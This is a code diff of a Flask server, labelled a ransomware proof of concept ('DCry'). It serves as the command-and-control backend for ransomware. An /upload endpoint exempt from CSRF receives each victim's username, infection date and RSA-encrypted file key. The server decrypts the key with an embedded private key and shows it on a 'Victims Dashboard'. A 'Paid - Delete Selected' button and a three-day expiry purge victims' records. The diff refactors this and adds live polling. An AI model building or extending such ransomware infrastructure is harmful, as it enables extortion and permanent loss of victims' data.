@@ -26,7 +26,7 @@ from flask import (
     redirect,
     url_for,
     flash,
-    current_app,
+    jsonify,
 )
 
 RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
@@ -79,39 +79,30 @@ p/Bmpsy6FRQKOcmgrYSRvowlpRpTiVV5YUXRbs0a7BZyGmWPQNdDyYwS8Jd6Gw7c
 mpmYQieZagWLb9GkxyToV1E28hXNiOfIBkiUMNx6l9jJWidbcQAmpVwd6E44E5ni
 EUIe7NbP2tggohOF6WGpf6wb0AuWVXdXWkRdKa8WXdpH2u/f7Z2Le7NOxV4gRg5p
 JuFhYChYqOk47EbQPBHRLaOlq2fLTsxPDZ3wje0DBsnLZ/2e2pHv2efaIA==
------END RSA PRIVATE KEY-----"""  # Replace with your private key if needed
+-----END RSA PRIVATE KEY-----"""
 
 app = Flask(__name__)
-
 app.config["SECRET_KEY"] = "dcry-ransomware-poc"
 csrf = CSRFProtect(app)
 
 VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
-
 os.makedirs(VICTIM_FOLDER, exist_ok=True)
-
 
 def decrypt_key(encrypted_key):
     private_key = RSA.import_key(RSA_PRIVATE_KEY)
     cipher_rsa = PKCS1_OAEP.new(private_key)
     return cipher_rsa.decrypt(encrypted_key)
 
-
 def sanitize_path_component(component):
-    if not component:
-        return "_"
+    if not component: return "_"
     component = re.sub(r"[^a-zA-Z0-9_-]", "_", component)
-    if component == "." or component == "..":
-        return "_"
+    if component in [".", ".."]: return "_"
     return component
-
 
 def is_safe_path(victim_id):
     base_dir = os.path.abspath(VICTIM_FOLDER)
     victim_path = os.path.join(base_dir, victim_id)
-    real_victim_path = os.path.abspath(victim_path)
-    return os.path.commonprefix([real_victim_path, base_dir]) == base_dir
-
+    return os.path.commonprefix([os.path.abspath(victim_path), base_dir]) == base_dir
 
 def victim_is_expired(date_str, days_valid=3):
     try:
@@ -119,41 +110,6 @@ def victim_is_expired(date_str, days_valid=3):
         return datetime.now() > infected_date + timedelta(days=days_valid)
     except Exception:
         return False
-
-
-@app.route("/delete_victim", methods=["POST"])
-def delete_victim_route():
-    victim_ids = request.form.getlist("victim_ids")
-
-    if not victim_ids:
-        flash("No items were selected for deletion.", "warning")
-        return redirect(url_for("dashboard"))
-
-    deleted_count = 0
-    failed_count = 0
-
-    for victim_id in victim_ids:
-        sanitized_id = sanitize_path_component(victim_id)
-        if not sanitized_id or sanitized_id == "_" or not is_safe_path(sanitized_id):
-            app.logger.warning(f"Skipping invalid or unsafe victim ID: {victim_id}")
-            failed_count += 1
-            continue
-
-        if delete_victim(sanitized_id):
-            deleted_count += 1
-        else:
-            failed_count += 1
-
-    if deleted_count > 0:
-        flash(f"Successfully deleted {deleted_count} selected item(s).", "success")
-    if failed_count > 0:
-        flash(
-            f"Failed to delete {failed_count} item(s). They may be invalid or already removed.",
-            "danger",
-        )
-
-    return redirect(url_for("dashboard"))
-
 
 def delete_victim(victim_id):
     path = os.path.join(VICTIM_FOLDER, victim_id)
@@ -167,6 +123,65 @@ def delete_victim(victim_id):
             return False
     return False
 
+def get_victims_data():
+    victims_data = []
+    try:
+        for vid in os.listdir(VICTIM_FOLDER):
+            if not is_safe_path(vid): continue
+
+            vid_safe = sanitize_path_component(vid)
+            if not vid_safe or vid_safe == "_": continue
+
+            folder = os.path.join(VICTIM_FOLDER, vid_safe)
+            info_path = os.path.join(folder, "info.txt")
+            key_path = os.path.join(folder, "key.txt")
+
+            if not os.path.isfile(info_path) or not os.path.isfile(key_path): continue
+
+            try:
+                info = {k: v for line in open(info_path, "r") if "=" in line for k, v in [line.strip().split("=", 1)]}
+
+                if victim_is_expired(info.get("date", ""), 3):
+                    delete_victim(vid_safe)
+                    continue
+
+                with open(key_path, "r") as f:
+                    key = f.read()
+
+                victims_data.append({
+                    "username": flask_escape(info.get("username", "")),
+                    "id": flask_escape(vid_safe),
+                    "date": flask_escape(info.get("date", "")),
+                    "key": flask_escape(key),
+                })
+            except Exception as e:
+                app.logger.error(f"Error reading data for {vid_safe}: {e}")
+                continue
+    except Exception as e:
+        app.logger.error(f"Error listing victims: {e}")
+    return victims_data
+
+@app.route("/delete_victim", methods=["POST"])
+def delete_victim_route():
+    victim_ids = request.form.getlist("victim_ids")
+    if not victim_ids:
+        flash("No items were selected for deletion.", "warning")
+        return redirect(url_for("dashboard"))
+    
+    deleted_count, failed_count = 0, 0
+    for victim_id in victim_ids:
+        sanitized_id = sanitize_path_component(victim_id)
+        if not sanitized_id or sanitized_id == "_" or not is_safe_path(sanitized_id):
+            app.logger.warning(f"Skipping invalid or unsafe victim ID: {victim_id}")
+            failed_count += 1
+            continue
+        if delete_victim(sanitized_id): deleted_count += 1
+        else: failed_count += 1
+
+    if deleted_count > 0: flash(f"Successfully deleted {deleted_count} selected item(s).", "success")
+    if failed_count > 0: flash(f"Failed to delete {failed_count} item(s).", "danger")
+    
+    return redirect(url_for("dashboard"))
 
 @app.route("/upload", methods=["POST"])
 @csrf.exempt
@@ -176,115 +191,57 @@ def upload():
     date = request.form.get("date", "")
     key = request.form.get("key", "")
     vid = sanitize_path_component(vid_raw)
-    if not vid or vid == "_":
-        return "Invalid victim ID.", 400
-    if not is_safe_path(vid):
-        return "Path Traversal attempt detected.", 400
+    if not vid or vid == "_": return "Invalid victim ID.", 400
+    if not is_safe_path(vid): return "Path Traversal attempt detected.", 400
+    
     folder = os.path.join(VICTIM_FOLDER, vid)
     os.makedirs(folder, exist_ok=True)
-    info_path = os.path.join(folder, "info.txt")
-    with open(info_path, "w") as f:
+    with open(os.path.join(folder, "info.txt"), "w") as f:
         f.write(f"username={username}\n")
         f.write(f"date={date}\n")
-    key_path = os.path.join(folder, "key.txt")
     try:
-        encrypted_key = base64.b64decode(key)
-        decrypted_key = decrypt_key(encrypted_key)
-        with open(key_path, "wb") as f:
+        decrypted_key = decrypt_key(base64.b64decode(key))
+        with open(os.path.join(folder, "key.txt"), "wb") as f:
             f.write(decrypted_key)
     except Exception as e:
         return f"Key decryption failed: {e}", 400
     return "Upload success."
 
+@app.route("/dashboard-data")
+def dashboard_data():
+    victims = get_victims_data()
+    return jsonify(victims)
 
 @app.route("/dashboard")
 def dashboard():
-    victims_data = []
-    try:
-        for vid in os.listdir(VICTIM_FOLDER):
-            if not is_safe_path(vid):
-                continue
-
-            vid_safe = sanitize_path_component(vid)
-            if not vid_safe or vid_safe == "_":
-                continue
-
-            folder = os.path.join(VICTIM_FOLDER, vid_safe)
-            info_path = os.path.join(folder, "info.txt")
-            key_path = os.path.join(folder, "key.txt")
-
-            if not os.path.isfile(info_path) or not os.path.isfile(key_path):
-                continue
-
-            try:
-                info = {}
-                with open(info_path, "r") as f:
-                    for line in f:
-                        if "=" in line:
-                            k, v = line.strip().split("=", 1)
-                            info[k] = v
-
-                if victim_is_expired(info.get("date", ""), 3):
-                    delete_victim(vid_safe)
-                    continue
-
-                with open(key_path, "r") as f:
-                    key = f.read()
-
-                victims_data.append(
-                    {
-                        "username": flask_escape(info.get("username", "")),
-                        "id": flask_escape(vid_safe),
-                        "date": flask_escape(info.get("date", "")),
-                        "key": flask_escape(key),
-                    }
-                )
-            except Exception as e:
-                app.logger.error(f"Error reading victim data for {vid_safe}: {e}")
-                continue
-    except Exception as e:
-        app.logger.error(f"Error listing victims: {e}")
+    victims_data = get_victims_data()
     html = """
 <!DOCTYPE html>
 <html lang="vi" data-bs-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="3">
     <title>DCry Victims Dashboard</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
-    <style>
-        body {
-            padding: 1.5rem;
-        }
-        .container h1 {
-            margin-bottom: 1.5rem;
-        }
-    </style>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style> body { padding: 1.5rem; } .container h1 { margin-bottom: 1.5rem; } </style>
 </head>
 <body>
     <div class="container">
         <div class="d-flex justify-content-between align-items-center mb-3">
             <h1>DCry Victims Dashboard</h1>
         </div>
-
         <div class="mb-3">
             <input type="text" id="searchInput" class="form-control" placeholder="Search by Username or ID...">
         </div>
-
         <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Are you sure you want to delete the selected victims?');">
-
             <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
-
             <div class="table-responsive">
                 <table class="table table-hover table-bordered align-middle">
                     <thead class="table-light">
                         <tr>
-                            <th scope="col" class="text-center" style="width: 5%;">
-                                <input class="form-check-input" type="checkbox" id="selectAllCheckbox">
-                            </th>
+                            <th scope="col" class="text-center" style="width: 5%;"><input class="form-check-input" type="checkbox" id="selectAllCheckbox"></th>
                             <th scope="col">Username</th>
-                            <th scope="col">ID (folder)</th>
+                            <th scope="col">ID</th>
                             <th scope="col">Infected Date</th>
                             <th scope="col">Key</th>
                         </tr>
@@ -292,9 +249,7 @@ def dashboard():
                     <tbody id="victimsTableBody">
                     {% for v in victims %}
                         <tr>
-                            <td class="text-center">
-                                <input class="form-check-input" type="checkbox" name="victim_ids" value="{{ v.id }}">
-                            </td>
+                            <td class="text-center"><input class="form-check-input" type="checkbox" name="victim_ids" value="{{ v.id }}"></td>
                             <td>{{ v.username }}</td>
                             <td><code>{{ v.id }}</code></td>
                             <td>{{ v.date }}</td>
@@ -304,11 +259,69 @@ def dashboard():
                     </tbody>
                 </table>
             </div>
-
             <button type="submit" class="btn btn-danger mt-3">Paid - Delete Selected</button>
         </form>
     </div>
+    
+    <div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1100">
+        {% with messages = get_flashed_messages(with_categories=true) %}
+        {% if messages %}
+            {% for category, message in messages %}
+            <div class="toast align-items-center text-bg-{{ category }} border-0" role="alert" aria-live="assertive" aria-atomic="true">
+                <div class="d-flex">
+                    <div class="toast-body">{{ message }}</div>
+                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+                </div>
+            </div>
+            {% endfor %}
+        {% endif %}
+        {% endwith %}
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
     <script>
+        async function updateTable() {
+            try {
+                const response = await fetch('/dashboard-data');
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                const victims = await response.json();
+                const tableBody = document.getElementById('victimsTableBody');
+                
+                // Store current checked state
+                const checkedIds = new Set();
+                tableBody.querySelectorAll('input[type="checkbox"]:checked').forEach(cb => {
+                    checkedIds.add(cb.value);
+                });
+                
+                tableBody.innerHTML = '';
+
+                victims.forEach(v => {
+                    const isChecked = checkedIds.has(v.id) ? 'checked' : '';
+                    const rowHtml = `
+                        <tr>
+                            <td class="text-center">
+                                <input class="form-check-input" type="checkbox" name="victim_ids" value="${v.id}" ${isChecked}>
+                            </td>
+                            <td>${v.username}</td>
+                            <td><code>${v.id}</code></td>
+                            <td>${v.date}</td>
+                            <td><code>${v.key}</code></td>
+                        </tr>
+                    `;
+                    tableBody.insertAdjacentHTML('beforeend', rowHtml);
+                });
+                
+                document.getElementById('searchInput').dispatchEvent(new Event('keyup'));
+
+            } catch (error) {
+                console.error("Failed to update victim data:", error);
+            }
+        }
+
+        setInterval(updateTable, 3000);
+        
         document.getElementById('selectAllCheckbox').addEventListener('click', function(event) {
             const victimCheckboxes = document.querySelectorAll('#victimsTableBody input[type="checkbox"]');
             for (const checkbox of victimCheckboxes) {
@@ -317,61 +330,30 @@ def dashboard():
                 }
             }
         });
+
         document.getElementById('searchInput').addEventListener('keyup', function() {
             const filter = this.value.toLowerCase();
-            const tableBody = document.getElementById('victimsTableBody');
-            const rows = tableBody.getElementsByTagName('tr');
-
+            const rows = document.getElementById('victimsTableBody').getElementsByTagName('tr');
             for (const row of rows) {
-                const usernameCell = row.cells[1];
-                const idCell = row.cells[2];
-
-                if (usernameCell && idCell) {
-                    const usernameText = usernameCell.textContent || usernameCell.innerText;
-                    const idText = idCell.textContent || idCell.innerText;
-
-                    if (usernameText.toLowerCase().includes(filter) || idText.toLowerCase().includes(filter)) {
-                        row.style.display = "";
-                    } else {
-                        row.style.display = "none";
-                    }
+                const usernameCell = row.cells[1].textContent.toLowerCase();
+                const idCell = row.cells[2].textContent.toLowerCase();
+                if (usernameCell.includes(filter) || idCell.includes(filter)) {
+                    row.style.display = "";
+                } else {
+                    row.style.display = "none";
                 }
             }
         });
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const toastElList = document.querySelectorAll('.toast');
+            const toastList = [...toastElList].map(toastEl => new bootstrap.Toast(toastEl).show());
+        });
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
 </body>
-<div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1100">
-
-    {% with messages = get_flashed_messages(with_categories=true) %}
-    {% if messages %}
-        {% for category, message in messages %}
-        
-        <div class="toast align-items-center text-bg-{{ category }} border-0" role="alert" aria-live="assertive" aria-atomic="true">
-            <div class="d-flex">
-                <div class="toast-body">
-                    {{ message }}
-                </div>
-                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
-            </div>
-        </div>
-
-        {% endfor %}
-    {% endif %}
-    {% endwith %}
-
-</div>
-
-<script>
-    document.addEventListener('DOMContentLoaded', (event) => {
-        const toastElList = document.querySelectorAll('.toast');
-        const toastList = [...toastElList].map(toastEl => new bootstrap.Toast(toastEl).show());
-    });
-</script>
 </html>
     """
     return render_template_string(html, victims=victims_data)
-
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
